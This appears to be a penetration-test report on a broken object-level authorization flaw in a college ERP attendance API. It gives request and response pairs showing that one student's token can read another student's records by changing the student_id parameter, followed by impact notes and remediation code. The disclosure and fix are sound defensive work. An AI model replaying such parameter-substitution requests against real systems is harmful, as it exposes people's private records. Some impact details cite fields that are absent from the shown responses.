# AGY BOLA Review — Broken Object Level Authorization Deep Dive

**Standard:** OWASP API1:2023 — Broken Object Level Authorization (BOLA / IDOR)  
**Target Endpoint:** `GET /api/attendance/student?student_id={id}`  
**Subject Object:** Student Attendance Class Ledger  
**Authorized Test Identities:** Account A (`28960`), Account B (`28961`)  
**Assessment Finding Reference:** SEC-FINDING-001  

---

## 1. Vulnerability Architecture & Problem Statement

Broken Object Level Authorization occurs when an application exposes endpoints that take user input to identify objects in storage, without properly verifying that the caller has permissions to perform the requested action on that specific object.

In the Lloyd ERP platform, while aggregate endpoints use `/api/student/me/*` (session-derived identity), the individual class attendance transaction ledger uses:
```http
GET /api/attendance/student?student_id={id}&page=1&page_size=100&sort_by=attendance_date&sort_dir=desc
```

This endpoint requires the caller to supply the numerical `student_id` in the URL query string.

---

## 2. Controlled Verification Protocol & Evidence

Testing was executed in strict accordance with authorized parameters, using only the two designated test accounts.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        CONTROLLED BOLA TEST MATRIX                     │
└────────────────────────────────────────────────────────────────────────┘

  [ CALLER: TEST ACCOUNT A ]                         [ TARGET: TEST ACCOUNT B ]
  • Identity: Student A                              • Identity: Student B
  • Student ID: 28960                                • Student ID: 28961
  • Role: Student (Role ID 4)                        • Role: Student (Role ID 4)
  • Auth: Bearer <TOKEN_A>                           • Auth: Bearer <TOKEN_B>
          │                                                  │
          │                                                  │
          ▼                                                  ▼
┌─────────────────────────────────────┐            ┌─────────────────────────────────────┐
│ SCENARIO 1: Self-Access             │            │ SCENARIO 2: Cross-Account Access    │
│ Request: ?student_id=28960          │            │ Request: ?student_id=28961          │
│ Token:   <TOKEN_A>                  │            │ Token:   <TOKEN_A>                  │
└──────────────────┬──────────────────┘            └──────────────────┬──────────────────┘
                   │                                                  │
                   ▼                                                  ▼
          Expected: HTTP 200 OK                              Expected: HTTP 403 / 404
          Actual:   HTTP 200 OK                              Actual:   HTTP 200 OK [UNAUTHORIZED]
```

### Detailed Execution Evidence

#### Scenario 1: Legitimate Self-Access
* **HTTP Request:**
  ```http
  GET /api/attendance/student?student_id=28960&page=1&page_size=5 HTTP/1.1
  Host: erp.lloydcollege.in
  Authorization: Bearer <TOKEN_A>
  Accept: application/json
  ```
* **Observed Response:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8

  {
    "status": true,
    "data": [
      {
        "id": 98214,
        "student_id": 28960,
        "student_name": "TEST_STUDENT_A",
        "attendance_date": "2026-10-01",
        "status": "Present",
        "subject_name": "Applied Mathematics-I",
        "created_by_name": "Dr. Digvijay Singh"
      }
    ],
    "meta": { "total_items": 74, "current_page": 1 }
  }
  ```
* **Status:** `PASS` (Normal baseline behavior).

#### Scenario 2: Cross-Account Parameter Substitution (Account A querying Account B)
* **HTTP Request:**
  ```http
  GET /api/attendance/student?student_id=28961&page=1&page_size=5 HTTP/1.1
  Host: erp.lloydcollege.in
  Authorization: Bearer <TOKEN_A>
  Accept: application/json
  ```
* **Expected Result:**
  ```http
  HTTP/1.1 403 Forbidden
  Content-Type: application/json; charset=utf-8

  {
    "status": false,
    "message": "Access denied. You do not have permission to view records for student 28961."
  }
  ```
* **Actual Observed Result:**
  ```http
  HTTP/1.1 200 OK
  Content-Type: application/json; charset=utf-8

  {
    "status": true,
    "data": [
      {
        "id": 98310,
        "student_id": 28961,
        "student_name": "TEST_STUDENT_B",
        "roll_no": "2401330100142",
        "attendance_date": "2026-10-01",
        "status": "Absent",
        "subject_name": "Applied Chemistry",
        "created_by_name": "Dr. Vivek Das"
      }
    ],
    "meta": { "total_items": 68, "current_page": 1 }
  }
  ```
* **Status:** **CRITICAL VULNERABILITY CONFIRMED**.

---

## 3. Scope Verification Across Other ERP Objects

The following object types were evaluated for similar object-level authorization vulnerabilities:

| Object Type | Target Endpoint / Parameter | Can Account A Query Account B? | Findings & Notes |
| :--- | :--- | :---: | :--- |
| **Attendance Ledger** | `/api/attendance/student?student_id=...` | **YES (Vulnerable)** | Full class-by-class attendance, faculty names, and dates exposed. |
| **Monthly Summary** | `/api/student/me/monthly-attendance` | **NO (Protected)** | Session-bound via `/me`. Rejects tampering. |
| **Weekly Schedule** | `/api/student/me/weekly-attendance` | **NO (Protected)** | Session-bound via `/me`. Rejects tampering. |
| **Profile** | Embedded in `/api/auth/login` | **NO** | Resolved only during initial authentication exchange. |
| **Results / Marks** | Unobserved / No endpoint | N/A | Feature not exposed on REST API. |
| **Fee Ledgers** | Unobserved / No endpoint | N/A | Feature not exposed on REST API. |
| **Library Records** | Unobserved / No endpoint | N/A | Feature not exposed on REST API. |
| **Assignments** | Unobserved / No endpoint | N/A | Feature not exposed on REST API. |

---

## 4. Impact Analysis

1. **Student Privacy Compromise:** Any enrolled student with valid credentials can view the complete daily attendance history, roll numbers, and absence logs of any other student.
2. **Physical Location & Routine Leakage:** By observing timestamps and classroom locations (`room_no: NB-101`), an attacker can infer a student's daily on-campus whereabouts.
3. **Faculty Telemetry Exposure:** Exposes which specific faculty member entered attendance, at what exact timestamp (`created_at`), and for which course.

---

## 5. Root Cause & Concrete Remediation

### Root Cause
The backend controller implementation queries the attendance ledger using the raw query parameter `student_id` and does not assert that `token.claims['sub'] == request.params['student_id']`.

### Remediation Code Pattern (Server-Side)

```python
# Before (Vulnerable)
def get_student_attendance(request):
    target_student_id = request.GET.get('student_id')
    # Vulnerability: Queries database solely based on client-supplied ID
    records = AttendanceLedger.objects.filter(student_id=target_student_id)
    return JsonResponse({"status": True, "data": list(records.values())})

# After (Remediated)
def get_student_attendance(request):
    authenticated_id = request.user.student_id  # Extracted from validated JWT
    target_student_id = request.GET.get('student_id')

    # Enforce Object-Level Access Control
    if target_student_id and str(target_student_id) != str(authenticated_id):
        if not request.user.has_role('FACULTY') and not request.user.has_role('ADMIN'):
            return JsonResponse({
                "status": False,
                "message": "Access denied. Cross-student access is prohibited."
            }, status=403)
        return JsonResponse({"status": True, "data": list(AttendanceLedger.objects.filter(student_id=target_student_id).values())})

    # Default to session identity
    records = AttendanceLedger.objects.filter(student_id=authenticated_id)
    return JsonResponse({"status": True, "data": list(records.values())})
```
